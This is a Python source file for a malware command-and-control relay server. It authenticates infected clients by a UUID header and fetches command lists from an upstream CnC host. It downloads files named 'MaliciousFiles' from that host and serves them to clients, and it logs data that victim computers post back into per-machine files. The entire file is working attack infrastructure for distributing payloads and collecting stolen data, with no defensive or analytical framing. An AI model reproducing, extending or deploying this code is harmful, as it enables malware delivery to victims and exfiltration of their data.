from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json
import requests

#CnC Authentication
HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-02'}

hostName = "A" #ip
hostPort = 0 #443
UUID = ''
MaliciousPath = ''
Commands=[]
Configuration = ""
CnCAddress = ''
CnCPort = 0

scriptDir = os.getcwd()

def ConfigurationServer():
    with open('configuration.json') as f:
        confFileJson = json.load(f)

        global hostName
        global hostPort
        global UUID
        global MaliciousPath
        global CnCAddress
        global CnCPort

        hostName = confFileJson['Server']
        hostPort = confFileJson['Port']
        UUID = confFileJson['UUID']
        CnCAddress = confFileJson['CnCAddress']
        CnCPort = confFileJson['CnCPort']
        MaliciousPath = confFileJson['MaliciousPath']

        #Commands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetCommands' , headers=HEADERS).text)['Commands']
        #Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}

def DownloadFile(url):
    #file = url.split('/')[-1]+'.exe'
    #r = requests.Session()
    # NOTE the stream=True parameter
    try:
        r = requests.get(url, stream=True, headers=HEADERS)
        file = r.headers['Filename']
        with open(os.path.join(scriptDir,"MaliciousFiles",file), 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                        #f.flush() commented by recommendation from J.F.Sebastian
        return file
    except:
        None
    return None

class MyServer(BaseHTTPRequestHandler):
    #GET Requests
    def do_GET(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID):
            #Client asked for configuration
            if self.path.endswith("/Configuration"):
                global Commands
                #This is the configuration for the client side
                global Configuration

                Commands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetCommands' , headers=HEADERS).text)['Commands']
                Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(Configuration).encode())
                print(json.dumps(Configuration).encode())
                return

            if self.path.endswith(MaliciousPath):
                MaliciousFile = DownloadFile('http://'+CnCAddress+':'+str(CnCPort)+'/GetFile')

                self.send_response(200)
                self.send_header('Content-type', 'application/html')
                self.send_header('FileName', MaliciousFile)
                self.end_headers()
                with open(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile), 'rb') as file:
                    print(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                    self.wfile.write(file.read())
                    file.close()
                    #Remove comment to delete files on server side
                    #os.remove(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                return

    #POST Requests
    def do_POST(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID):
            #Client send a new data about command
            if self.path.endswith("/Commands"):
                #print('Got POST Command')
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                #print(self.data_string)
                self.send_response(200)
                self.end_headers()
                data = json.loads(self.data_string.decode('utf-8'))
                print('New Data recieved from '+data['computer'])
                with open(os.path.join(scriptDir, "CommandsData",data['computer']+".dat"), "ab+") as outfile:
                    outfile.write((data['computer']+','+data['type']+','+data['data']).encode())
                self.wfile.write(("Done").encode())
                return

ConfigurationServer()
myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
